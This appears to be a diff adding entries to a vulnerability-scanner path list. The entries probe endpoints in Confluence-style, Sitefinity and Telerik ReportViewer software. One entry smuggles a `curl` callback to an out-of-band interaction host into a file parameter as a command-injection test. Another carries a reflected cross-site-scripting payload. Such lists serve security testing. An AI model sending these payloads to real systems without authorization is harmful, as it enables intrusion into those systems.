@@ -1,0 +1,5 @@
+/access/set?param=enableapi&value=1
+/service.pdfs/confluence?lang=en&file=`curl+{{interactsh-url}}`
+/AHT/
+/Sitefinity/Authenticate/SWT
+/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
